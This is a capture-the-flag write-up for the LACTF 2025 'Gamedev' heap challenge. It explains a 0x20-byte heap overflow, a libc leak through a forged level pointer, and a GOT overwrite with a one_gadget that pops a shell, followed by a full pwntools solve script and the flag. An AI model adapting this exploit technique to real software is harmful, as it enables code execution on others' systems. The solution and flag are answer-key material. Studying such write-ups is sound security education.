---
ctf: LACTF
title: Gamedev
authors:
    - name: bliutech
      url: https://www.bliu.tech
description: You've heard of rogue-likes, but have you heard of heap-likes?
categories:
    - PWN
year: 2025
challengefiles: gamedev
published: "2025-02-15"
---

# TL;DR<a id="TL;DR"></a>
    **- Challenge Setup:** This challenge is a typical CRUD heap challenge.
    **- Vulnerability:** Heap overflow
    **- Exploitation:** Use the overflow to overwrite a pointer and thus overwriting the GOT

# 1. Introduction<a id="introduction"></a>
The challenge is about some levels we are able to create and modify with the typical set of CRUD operations.

# 2. Reconnaissance<a id="reconnaissance"></a>
Examining the code we notice a heap overflow in the `edit_level` functionality:

```c
fgets(curr->data, 0x40, stdin);
```

The `curr->data` buffer can only hold 0x20 bytes so we have an overflow of 0x20 bytes.

# 3. Vulnerability Description<a id="vulnerability description"></a>
The overflow should be enough to modify meta data of the following chunk and even overwrite content of it. Moreover we get a `PIE` leak for free just right at the start, so we already know the address of the `GOT`.

# 4. Exploitation<a id="exploitation"></a>
The only annoying thing about this challenge are the checks that we are not allowed to modify the chunks if the current level is the same as the previous level which can be circumvented by using the `reset` functionality to set our current level back to the very first one.
At first we need a libc leak. This can be done by overwriting one of the `next` pointers of the level struct. As we don't have any leaks yet except for the binary base we need a pointer to libc within the binary itself.

![gdb-libc-leak-pointer](ctf/writeups/lactf/gamedev/gdb_libc_leak_pointer.png "gdb-libc-leak-pointer")

I chose the pointer to `__libc_start_main`. So by overwriting the `next` pointer with the pointer containing the pointer to `__libc_start_main`, we can traverse the different levels via the `explore` functionality until we are in the faked level and thus can leak the libc with the `test_level` functionality. Now we just need to overwrite an entry in the `GOT` with a working onegadget by applying the same trick as for the leak and pop a shell.

# 5. Mitigation<a id="mitigation"></a>
Check the bounds of used buffers and use variables saving these bounds instead of hardcoding magic numbers one by one.

# 6. Solve Script<a id="solve script"></a>
```python
#!/usr/bin/env python3
from string import Template
import glob
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'debug'

# must be dict
ENV_VARS = None

gdbscript = """
set max-visualize-chunk-size 0x100
continue
"""

def create_level(io, idx):
    io.sendlineafter(b"Choice:", b"1")
    io.sendlineafter(b"Enter level index: ", idx)

def edit_level(io, data):
    io.sendlineafter(b"Choice:", b"2")
    io.sendlineafter(b"Enter level data: ", data)

def test_level(io):
    io.sendlineafter(b"Choice:", b"3")
    return get_new_data(io)

def explore(io, idx):
    io.sendlineafter(b"Choice:", b"4")
    io.sendlineafter(b"index:", idx)

def reset(io):
    io.sendlineafter(b"Choice:", b"5")

def exit(io):
    io.sendlineafter(b"Choice:", b"6")

def get_new_data(io):
    return io.recvuntil("6. Exit\n")

def base_leak(io):
    start = get_new_data(io)
    base_leak = get_string_between(start, b"A welcome gift: ", b"\n")
    base_offset = 0x1662
    base_addr = int(base_leak, 16) - base_offset
    validate_leaked_addresses(io, bin_base=base_addr)
    return base_addr

def libc_leak(io, libc_start_main_leak):
    with_offset_to_libc_start_main = libc_start_main_leak - 0x8 * 0x8
    reset(io)
    explore(io, b'0')
    edit_level(io, b'A'*0x20+b'B'*0x10+p64(with_offset_to_libc_start_main)+b'\x00'*8)
    reset(io)
    explore(io, b'1')
    explore(io, b'0')
    leak = test_level(io)[:19].split(b' Level data: ')[1]
    libc_leak = int.from_bytes(leak, byteorder='little')
    libc_leak_offset = 0x27280
    libc_base = libc_leak - libc_leak_offset
    validate_leaked_addresses(io, libc_base=libc_base)
    return libc_base

def preps(io):
    create_level(io, b'0')
    create_level(io, b'1')
    create_level(io, b'2')
    explore(io, b'0')
    edit_level(io, b'A'*0x10)
    reset(io)
    explore(io, b'1')
    create_level(io, b'0')

def overwrite_got(io, got_addr):
    target_entry_got = 7
    got_target = got_addr - (0x8 * 0x8) + (0x8 * target_entry_got)
    reset(io)
    explore(io, b'0')
    edit_level(io, b'A'*0x20+b'B'*0x10+p64(got_target)+b'\x00'*8)

    reset(io)
    explore(io, b'1')
    explore(io, b'0')

    one_gadget_offset = 0xd511f
    # one_gadget_offset = 0x4c139
    # one_gadget_offset = 0x4c140

    gadget_addr = libc.address + one_gadget_offset
    edit_level(io, p64(gadget_addr))
    io.sendline(b'-i\x00')

def main():
    io = start_conn()
    base_addr = base_leak(io)
    exe.address = base_addr

    got_offset = 0x4000
    got_addr = base_addr + got_offset

    libc_start_main_offset = 0x3FC0
    libc_start_main_leak = base_addr + libc_start_main_offset
    preps(io)
    libc_base = libc_leak(io, libc_start_main_leak)
    libc.address = libc_base

    overwrite_got(io, got_addr)

    io.interactive()
    clean_up()







### Helper start

def start_conn():
    if args.REMOTE:
        log.info(Template('Starting with remote connection to $HOST on port $PORT...').substitute(HOST=sys.argv[1], PORT=sys.argv[2]))
        io = remote(sys.argv[1], sys.argv[2])
    else:
        log.info('Starting locally...')
        io = process([exe.path], env=ENV_VARS)
        if args.GDB:
            log.info('Starting with GDB...')
            gdb.attach(io, gdbscript=gdbscript, exe=exe.path)
    return io


def get_string_between(res, first_const_str, second_const_str):
    return res.split(first_const_str)[1].split(second_const_str)[0]


def get_mapping_offset(proc_mapping, search_for):
    heap_offset = 0
    for i, mapping in enumerate(proc_mapping):
        if search_for in mapping:
            heap_offset = i
            break
    return heap_offset


def validate_leaked_addr(proc_mapping, offset, given_addr, addr_name):
    true_base = int(proc_mapping[offset].split('-')[0], 16)
    if int(given_addr) != true_base:
        log.critical(
            Template('Leaked $ADDR_NAME $GIVEN_ADDR is not the correct $ADDR_NAME like $TRUE_BASE').substitute(
                ADDR_NAME=addr_name, GIVEN_ADDR=hex(given_addr), TRUE_BASE=hex(true_base)
            ))
    else:
        log.info(
            Template('Leaked $ADDR_NAME $GIVEN_ADDR equals correct $ADDR_NAME $TRUE_BASE').substitute(
                ADDR_NAME=addr_name, GIVEN_ADDR=hex(given_addr), TRUE_BASE=hex(true_base)
            ))


def validate_leaked_addresses(io, bin_base=None, heap_base=None, libc_base=None, stack_base=None):
    if args.REMOTE:
        log.warning('Skipping leaked address validation because not running locally...')
        return

    with open(Template('/proc/$PROC_ID/maps').substitute(PROC_ID=io.proc.pid)) as f:
        proc_mapping = f.readlines()
    if bin_base:
        bin_path_split = exe.path.split('/')
        bin_path = bin_path_split[len(bin_path_split) - 1]
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, bin_path), bin_base, 'bin base')
    if heap_base:
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, 'heap'), heap_base, 'heap base')
    if libc_base:
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, 'libc'), libc_base, 'libc base')
    if stack_base:
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, 'stack'), stack_base, 'stack base')

    if not any([bin_base, heap_base, libc_base, stack_base]):
        log.warning('Skipping leaked address validation because no leaked addresses were given...')


def clean_up():
    # remove corefiles (memory dumps) being generated due to program crashes
    for corefile in glob.glob('core*'):
        os.remove(corefile)

### Helper end


if __name__ == "__main__":
    main()

```

# 7. Flag<a id="flag"></a>
lactf{ro9u3_LIk3_No7_R34LlY_RO9U3_H34P_LIK3_nO7_r34llY_H34P}
